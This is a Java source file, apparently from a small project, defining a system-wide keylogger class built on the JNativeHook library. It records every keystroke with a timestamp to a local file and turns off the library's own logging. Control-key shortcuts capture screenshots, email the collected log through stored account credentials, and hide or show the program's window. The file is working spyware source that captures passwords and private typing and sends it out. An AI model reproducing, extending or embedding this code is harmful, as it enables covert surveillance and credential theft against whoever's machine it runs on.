package controller;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements Runnable, NativeKeyListener {

    private final String Filename = "output.txt";
    FileWriter writer;
    BufferedWriter bwriter;

    private static Email email;
    private static Screenshot screenshot;
    private static int screenshotCount = 0;
    private boolean modded = false;
    private static Controller con;

    static String emailAddress, password;

    public void setCredentials( String emaill, String password) {
        emailAddress = emaill;
        this.password = password;
        email = new Email(emailAddress,password);

    }

    @Override
    public void run() {

        try
        {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex)
        {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());

        screenshot = new Screenshot(Filename);

        //disable logging

        // Get the logger for "org.jnativehook" and set the level to off.
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

// Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {


    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        try {
            //if writer is null then initialize writer
            writer = new FileWriter(Filename, true);
            bwriter = new BufferedWriter(writer);
            DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
            Date date = new Date();
            // write key pressed and date time
            bwriter.write(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())+ "\t");
            bwriter.write(dateFormat.format(date) + "\n");


            bwriter.close();
            writer.close();

            if(modded){
                switch (nativeKeyEvent.getKeyCode()){
                    case NativeKeyEvent.VC_S:
                        // if control + s is pressed then capture screenshot
                        screenshot.capture(screenshotCount + "shortcut");
                        screenshotCount++;
                        modded = false;
                        break;

                    case NativeKeyEvent.VC_E:
                        //if control + e is pressed then email
                        email.sendEmail();
                        modded= false;
                        break;


                    case NativeKeyEvent.VC_ESCAPE:
                        //if escape key is pressed, then un hook system
                        GlobalScreen.unregisterNativeHook();
                        modded = false;
                        break;

                    case NativeKeyEvent.VC_L:
                        this.con.hideDisplay();
                        modded = false;
                        break;

                    case NativeKeyEvent.VC_P:
                        this.con.showDisplay();
                        modded = false;
                        break;

                    default:
                        modded = false;
                        break;
                }
            }

            if(nativeKeyEvent.getKeyCode() ==  NativeKeyEvent.VC_CONTROL){
                modded = true;
            }



        } catch (IOException e) {
            e.printStackTrace();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    public void setCon(Controller con) {
        this.con = con;
        System.out.println(con);
    }
}
